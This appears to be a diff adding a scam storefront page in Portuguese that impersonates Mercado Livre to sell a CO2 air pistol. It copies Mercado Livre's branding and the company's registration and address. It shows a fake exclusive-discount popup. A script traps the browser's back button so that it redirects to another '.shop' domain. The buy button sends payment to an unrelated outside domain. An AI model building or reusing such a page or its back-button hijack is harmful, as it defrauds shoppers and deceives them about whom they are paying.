@@ -1,0 +1,606 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>
+  window.pixelId = "6870b566ce4296c5b72cfdfa";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<script>
+  // URL para onde o lead será redirecionado
+  const backUrl = "https://oferta-especialml25anos.shop/pressao/back/";
+
+  // Impede que o usuário retorne para a página anterior
+  history.pushState(null, null, location.href);
+
+  window.addEventListener("popstate", function () {
+    location.href = backUrl;
+  });
+</script>
+
+
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pistola de Pressão Co2 W129 4.5mm Blowback - Mercado Livre</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        /* Header */
+        .header {
+            background: #fff;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 12px 0;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .logo {
+            height: 34px;
+        }
+
+        /* Popup Overlay */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            opacity: 0;
+            animation: fadeIn 0.3s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+            }
+        }
+
+        .popup {
+            background: #fff;
+            border-radius: 8px;
+            padding: 32px 24px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            transform: scale(0.8);
+            animation: scaleIn 0.3s ease-out 0.1s forwards;
+        }
+
+        @keyframes scaleIn {
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .popup-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 16px;
+            color: #00a650;
+        }
+
+        .popup-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 16px;
+            color: #000;
+        }
+
+        .popup-text {
+            margin-bottom: 12px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        .popup-subtext {
+            font-size: 14px;
+            color: #999;
+            margin-bottom: 24px;
+        }
+
+        .popup-button {
+            background: #ffe600;
+            color: #000;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+        }
+
+        .popup-button:hover {
+            background: #f0d800;
+        }
+
+        /* Main Content */
+        .main-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 80px 16px 40px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+        }
+
+        /* Image Gallery */
+        .image-gallery {
+            position: relative;
+        }
+
+        .carousel-container {
+            position: relative;
+            overflow: hidden;
+            border-radius: 8px;
+            background: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .carousel-track {
+            display: flex;
+            transition: transform 0.3s ease;
+        }
+
+        .carousel-slide {
+            min-width: 100%;
+            aspect-ratio: 1;
+        }
+
+        .carousel-slide img {
+            width: 100%;
+            height: 100%;
+            -o-object-fit: cover;
+               object-fit: cover;
+        }
+
+        .carousel-nav {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255, 255, 255, 0.9);
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .carousel-nav:hover {
+            background: rgba(255, 255, 255, 1);
+        }
+
+        .carousel-nav.prev {
+            left: 16px;
+        }
+
+        .carousel-nav.next {
+            right: 16px;
+        }
+
+        .carousel-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .carousel-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ccc;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .carousel-dot.active {
+            background: #3483fa;
+        }
+
+        /* Product Info */
+        .product-info {
+            background: #fff;
+            padding: 24px;
+            border-radius: 8px;
+            height: -moz-fit-content;
+            height: fit-content;
+        }
+
+        .product-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #000;
+        }
+
+        .price-section {
+            margin-bottom: 20px;
+        }
+
+        .old-price {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        .current-price {
+            font-size: 32px;
+            font-weight: 700;
+            color: #00a650;
+            margin-bottom: 8px;
+        }
+
+        .shipping-info {
+            color: #3483fa;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .offer-info {
+            color: #999;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+
+        .buy-button {
+            background: #ffe600;
+            color: #000;
+            border: none;
+            padding: 16px 24px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 24px;
+            transition: background 0.2s;
+        }
+
+        .buy-button:hover {
+            background: #f0d800;
+        }
+
+        .benefits-list {
+            list-style: none;
+            margin-bottom: 24px;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #333;
+        }
+
+        .check-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            color: #00a650;
+            flex-shrink: 0;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f5f5f5;
+            padding: 40px 0;
+            margin-top: 60px;
+            border-top: 1px solid #e6e6e6;
+        }
+
+        .footer-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 16px;
+        }
+
+        .footer-links {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+
+        .footer-section h4 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 12px;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section li {
+            margin-bottom: 8px;
+        }
+
+        .footer-section a {
+            color: #999;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-section a:hover {
+            color: #3483fa;
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 24px;
+            border-top: 1px solid #e6e6e6;
+            color: #999;
+            font-size: 12px;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+                gap: 24px;
+                padding: 70px 16px 20px;
+            }
+
+            .product-title {
+                font-size: 20px;
+            }
+
+            .current-price {
+                font-size: 28px;
+            }
+
+            .popup {
+                margin: 20px;
+                padding: 24px 20px;
+            }
+
+            .popup-title {
+                font-size: 18px;
+            }
+
+            .footer-links {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <img src="images/Logotipo_MercadoLivre.png" alt="Mercado Livre" class="logo">
+        </div>
+    </header>
+
+    <!-- Popup Overlay -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup">
+            <svg class="popup-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M9 12l2 2 4-4"></path>
+                <circle cx="12" cy="12" r="10"></circle>
+            </svg>
+            <h2 class="popup-title">Parabéns, você foi escolhido!</h2>
+            <p class="popup-text">Você acaba de liberar um desconto exclusivo: de R$ 87,00 por apenas <strong>R$ 67,90</strong>.</p>
+            <p class="popup-subtext">Essa condição é única por CPF e pode ser usada apenas uma vez.</p>
+            <button class="popup-button" onclick="closePopup()">Resgatar Oferta Agora</button>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Image Gallery -->
+        <div class="image-gallery">
+            <div class="carousel-container">
+                <div class="carousel-track" id="carouselTrack">
+                    <div class="carousel-slide">
+                        <img src="images/1.png" alt="Pistola de Pressão Co2 W129 4.5mm Blowback">
+                    </div>
+                    <div class="carousel-slide">
+                        <img src="images/2.png" alt="Pistola de Pressão Co2 W129 4.5mm Blowback">
+                    </div>
+                    <div class="carousel-slide">
+                        <img src="images/3.png" alt="Pistola de Pressão Co2 W129 4.5mm Blowback">
+                    </div>
+                </div>
+                <button class="carousel-nav prev" onclick="previousSlide()">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M15 18l-6-6 6-6"></path>
+                    </svg>
+                </button>
+                <button class="carousel-nav next" onclick="nextSlide()">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 18l6-6-6-6"></path>
+                    </svg>
+                </button>
+            </div>
+            <div class="carousel-dots">
+                <span class="carousel-dot active" onclick="goToSlide(0)"></span>
+                <span class="carousel-dot" onclick="goToSlide(1)"></span>
+                <span class="carousel-dot" onclick="goToSlide(2)"></span>
+            </div>
+        </div>
+
+        <!-- Product Info -->
+        <div class="product-info">
+            <h1 class="product-title">Pistola de Pressão Co2 W129 4.5mm Blowback</h1>
+            
+            <div class="price-section">
+                <div class="old-price">R$ 87,00</div>
+                <div class="current-price">R$ 67,90</div>
+                <div class="shipping-info">Frete grátis para todo o Brasil</div>
+                <div class="offer-info">Oferta única por CPF</div>
+            </div>
+
+            <button class="buy-button" onclick="buyNow()">Comprar com Desconto</button>
+
+            <ul class="benefits-list">
+                <li class="benefit-item">
+                    <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 12l2 2 4-4"></path>
+                        <circle cx="12" cy="12" r="10"></circle>
+                    </svg>
+                    Kit 30 Ampolas De Co2 12g
+                </li>
+                <li class="benefit-item">
+                    <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 12l2 2 4-4"></path>
+                        <circle cx="12" cy="12" r="10"></circle>
+                    </svg>
+                    Kit 10 Ampolas De Co2 12g
+                </li>
+                <li class="benefit-item">
+                    <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M9 12l2 2 4-4"></path>
+                        <circle cx="12" cy="12" r="10"></circle>
+                    </svg>
+                    Garantia de 3 meses com o fornecedor
+                </li>
+            </ul>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <div class="footer-section">
+                    <h4>Atendimento ao cliente</h4>
+                    <ul>
+                        <li><a href="#">Central de ajuda</a></li>
+                        <li><a href="#">Contatos</a></li>
+                        <li><a href="#">Comprador</a></li>
+                        <li><a href="#">Vendedor</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Sobre o Mercado Livre</h4>
+                    <ul>
+                        <li><a href="#">Quem somos</a></li>
+                        <li><a href="#">Investidores</a></li>
+                        <li><a href="#">Sustentabilidade</a></li>
+                        <li><a href="#">Carreiras</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Outros sites</h4>
+                    <ul>
+                        <li><a href="#">Mercado Pago</a></li>
+                        <li><a href="#">Mercado Shops</a></li>
+                        <li><a href="#">Mercado Envios</a></li>
+                        <li><a href="#">Classificados</a></li>
+                    </ul>
+                </div>
+                <div class="footer-section">
+                    <h4>Redes sociais</h4>
+                    <ul>
+                        <li><a href="#">Twitter</a></li>
+                        <li><a href="#">Facebook</a></li>
+                        <li><a href="#">Instagram</a></li>
+                        <li><a href="#">YouTube</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>Copyright © 1999-2024 MercadoLibre Brasil LTDA.</p>
+                <p>CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo MercadoLibre.</p>
+                <p><a href="#">Termos e condições</a> | <a href="#">Política de privacidade</a></p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Carousel functionality
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.carousel-slide');
+        const dots = document.querySelectorAll('.carousel-dot');
+        const track = document.getElementById('carouselTrack');
+
+        function updateCarousel() {
+            track.style.transform = `translateX(-${currentSlide * 100}%)`;
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentSlide);
+            });
+        }
+
+        function nextSlide() {
+            currentSlide = (currentSlide + 1) % slides.length;
+            updateCarousel();
+        }
+
+        function previousSlide() {
+            currentSlide = (currentSlide - 1 + slides.length) % slides.length;
+            updateCarousel();
+        }
+
+        function goToSlide(index) {
+            currentSlide = index;
+            updateCarousel();
+        }
+
+        // Auto-advance carousel
+        setInterval(nextSlide, 5000);
+
+        // Popup functionality
+        function closePopup() {
+            const popup = document.getElementById('popupOverlay');
+            popup.style.animation = 'fadeOut 0.3s ease-out forwards';
+            setTimeout(() => {
+                popup.style.display = 'none';
+            }, 300);
+        }
+
+        // Buy button functionality
+        function buyNow() {
+            window.location.href = 'https://pay.acessounico.cloud/q510ZObmjPX3E9D';
+        }
+
+        // Add fadeOut animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes fadeOut {
+                to {
+                    opacity: 0;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+
+</body></html>
